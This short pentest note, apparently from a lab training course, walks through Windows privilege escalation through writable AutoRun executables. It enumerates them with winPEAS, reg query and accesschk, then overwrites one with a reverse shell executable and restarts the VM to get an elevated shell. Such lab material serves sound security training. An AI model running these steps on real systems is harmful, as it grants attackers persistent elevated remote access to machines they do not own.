1. Use winPEAS to check for writable AutoRun executables:

```batch - windows
.\winPEASx64.exe quiet applicationsinfo
```

2. Alternatively, we could manually enumerate the AutoRun executables:

```batch - windows
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

and then use accesschk.exe to verify the permissions on each one:

```batch - windows
.\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
```


3. >The “C:\Program Files\Autorun Program\program.exe” AutoRun executable is writable by Everyone. Create a backup of the original:

```batch - windows
copy "C:\Program Files\Autorun Program\program.exe" C:\Temp
```

4. Copy our reverse shell executable to overwrite the AutoRun executable:

[[1._Reverse Shells (WIN)#MSFVenom]]

```batch - windows
copy /Y C:\PrivEsc\reverse.exe "C:\Program files\AutorunProgram\program.exe"
```

5. Start a listener on Kali, and then restart the Windows VM to trigger the exploit. Note that on Windows 10, the exploit appears to run with the privileges of the last logged on user, so log out of the “user” account and log in as the “admin” account first.

![[___.Misc Commands#Restart host]]